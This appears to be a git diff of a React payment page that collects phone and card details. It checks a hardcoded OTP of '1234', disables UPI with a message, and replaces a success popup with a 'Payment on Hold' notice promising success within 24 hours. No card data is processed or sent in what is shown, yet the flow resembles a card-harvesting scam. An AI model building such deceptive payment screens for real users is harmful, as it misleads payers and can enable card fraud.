@@ -4,6 +4,7 @@ import React, { useState } from "react";
 import { FaPhoneAlt } from "react-icons/fa";
 
 function PaymentCredit() {
+  const [message, setMessage] = useState("");
   const [formData, setFormData] = useState({
     contact: "",
     name: "",
@@ -16,7 +17,7 @@ function PaymentCredit() {
   const [otp, setOtp] = useState("");
   const [success, setSuccess] = useState(false);
 
-  
+
   const handleChange = (e) => {
     const { name, value } = e.target;
 
@@ -41,7 +42,7 @@ function PaymentCredit() {
     setFormData((prev) => ({ ...prev, [name]: formattedValue }));
   };
 
- 
+
   const handleSubmit = (e) => {
     e.preventDefault();
 
@@ -54,15 +55,15 @@ function PaymentCredit() {
     console.log(`Sending OTP to +91${formData.contact}`);
     alert(`OTP sent to +91${formData.contact}`);
 
- 
+
     setShowOtpPopup(true);
   };
 
-  
+
   const handleVerifyOtp = (e) => {
     e.preventDefault();
 
-    
+
     if (otp === "1234") {
       setShowOtpPopup(false);
       setSuccess(true);
@@ -73,7 +74,7 @@ function PaymentCredit() {
 
   return (
     <>
-      
+
       <header className="fixed top-0 left-0 w-full z-50">
         <div className="py-1 flex justify-end gap-2 px-2 items-center bg-gradient-to-br bg-[#4779f8] to-[#e765d2]">
           <FaPhoneAlt color="white" />
@@ -91,16 +92,34 @@ function PaymentCredit() {
         </div>
       </header>
 
-      
-      <div className="min-h-screen flex items-center justify-center w-full bg-gray-100 pt-20">
-        <div className="flex justify-center items-center bg-gray-100">
+
+      <div className="min-h-screen flex items-center justify-evenly w-full bg-gray-100 pt-20 ">
+        <div className='flex justify-center items-center bg-gray-100 my-20'>
+          <div className='bg-white shadow-lg rounded-xl p-8 w-full'>
+            <div
+              className='bg-amber-50 p-2 cursor-pointer'
+              onClick={() => setMessage("UPI NOT Available")}
+            >
+              <img
+                src="https://i0.wp.com/facilityschool.com/wp-content/uploads/2023/01/UPI-payment-.jpg?fit=1200%2C675&ssl=1"
+                alt=""
+                className='w-100'
+              />
+            </div>
+            {message && (
+              <p className='text-red-500 mt-4 font-semibold text-2xl text-center'>{message}</p>
+            )}
+          </div>
+        </div>
+        <div className="flex justify-center items-center bg-gray-100 my-20">
           <form
             onSubmit={handleSubmit}
             className="bg-white shadow-lg rounded-xl p-8 w-full max-w-2xl"
           >
+
             <h2 className="text-lg font-bold mb-6">Credit Card/ Debit Card Payments</h2>
 
-            
+
             <div className="mb-4">
               <label className="block font-medium mb-2">Phone</label>
               <input
@@ -109,7 +128,7 @@ function PaymentCredit() {
                 value={formData.contact}
                 onChange={handleChange}
                 placeholder="Your Contact Phone"
-                className="w-full border rounded-lg pl-12 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                className="w-full border rounded-lg pl-10 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                 required
                 style={{
                   backgroundImage: `url(${indiaFlag})`,
@@ -120,7 +139,7 @@ function PaymentCredit() {
               />
             </div>
 
-           
+
             <div className="mb-4">
               <label className="block font-medium mb-2">Name on Card</label>
               <input
@@ -134,7 +153,7 @@ function PaymentCredit() {
               />
             </div>
 
-            
+
             <div className="mb-4">
               <label className="block font-medium mb-2">Card Number</label>
               <input
@@ -149,7 +168,7 @@ function PaymentCredit() {
               />
             </div>
 
-            
+
             <div className="flex gap-4 mb-4">
               <div className="w-1/2">
                 <label className="block font-medium mb-2">Expiry Date</label>
@@ -179,7 +198,7 @@ function PaymentCredit() {
               </div>
             </div>
 
-            
+
             <button
               type="submit"
               className="px-4 bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition-all cursor-pointer"
@@ -194,7 +213,7 @@ function PaymentCredit() {
         </div>
       </div>
 
-      
+
       {showOtpPopup && (
         <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
           <form
@@ -229,19 +248,39 @@ function PaymentCredit() {
         </div>
       )}
 
-      
+
       {success && (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center">
-          <div className="bg-white p-6 rounded-lg shadow-lg text-center">
-            <h3 className="text-lg font-bold text-green-600">✅ Payment Successful!</h3>
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center mt-10">
+          <div className="bg-white p-6 rounded-lg shadow-lg text-left max-w-lg w-full">
+            <h2 className="text-xl font-bold text-yellow-600 mb-2">
+              Payment on Hold – Card Payment
+            </h2>
+
+            <p className="text-gray-700 mb-3">
+              Your recent payment has been placed <span className="font-bold text-red-500">on hold</span> because it was made using a
+              <span className="font-semibold text-blue-500"> debit or credit card</span>.
+              This is a <span className="text-yellow-600 font-semibold">routine security measure </span>
+               to protect both you and the merchant from <span className="text-red-500 font-semibold">fraudulent transactions</span>.
+            </p>
+
+            <p className="text-gray-700 mb-3 text-2xl">
+              Within
+              <span className="font-bold text-green-600"> 24 hours</span>.
+             It will be
+              <span className="font-bold text-orange-500"> Succeed</span>.
+            </p>
+
+            
+
             <button
               onClick={() => setSuccess(false)}
-              className="mt-4 px-4 py-2 bg-blue-500 text-white rounded-lg"
+              className="mt-6 px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg cursor-pointer"
             >
               OK
             </button>
           </div>
         </div>
+
       )}
     </>
   );
